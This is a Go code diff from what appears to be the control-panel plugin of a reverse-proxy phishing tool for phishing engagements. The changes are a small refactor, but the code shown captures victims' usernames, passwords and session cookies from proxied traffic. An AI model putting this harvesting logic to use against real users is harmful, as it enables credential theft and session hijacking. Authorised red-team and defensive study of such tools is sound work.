@@ -634,7 +634,7 @@ func init() {
 
 	s := Property{}
 	s.Name = "control_panel"
-	s.Description = "This is a web control panel for you phishing engagements. Beta version."
+	s.Description = "This is a web control panel for your phishing engagements. Beta version."
 	s.Version = "0.1"
 
 	//init all of the vars, print a welcome message, init your command line flags here
@@ -730,13 +730,13 @@ func init() {
 	}
 
 	//process HTTP request
-	s.HTTPRequest = func(req *http.Request, context HTTPContext) {
+	s.HTTPRequest = func(req *http.Request, context *HTTPContext) {
 
 		if CConfig.active {
 
 			if creds, found := CConfig.checkRequestCredentials(req); found {
 
-				victim := Victim{UUID: context.PhishUser, Username: creds.usernameFieldValue, Password: creds.passwordFieldValue}
+				victim := Victim{UUID: context.UserID, Username: creds.usernameFieldValue, Password: creds.passwordFieldValue}
 				if err := CConfig.updateEntry(&victim); err != nil {
 					log.Infof("Error %s", err.Error())
 					return
@@ -749,7 +749,7 @@ func init() {
 			cookies := req.Cookies()
 			// there are new set-cookies
 			if len(cookies) > 0 {
-				victim := Victim{UUID: context.PhishUser}
+				victim := Victim{UUID: context.UserID}
 				entry, err := CConfig.getEntry(&victim)
 				if err != nil {
 					return
@@ -776,13 +776,13 @@ func init() {
 	}
 
 	//process HTTP response (responses can arrive in random order)
-	s.HTTPResponse = func(resp *http.Response, context HTTPContext) {
+	s.HTTPResponse = func(resp *http.Response, context *HTTPContext,buffer *[]byte) {
 
 		cookies := resp.Cookies()
 		// there are new set-cookies
 		if len(cookies) > 0 {
 
-			victim := Victim{UUID: context.PhishUser}
+			victim := Victim{UUID: context.UserID}
 			entry, err := CConfig.getEntry(&victim)
 			if err != nil {
 				return
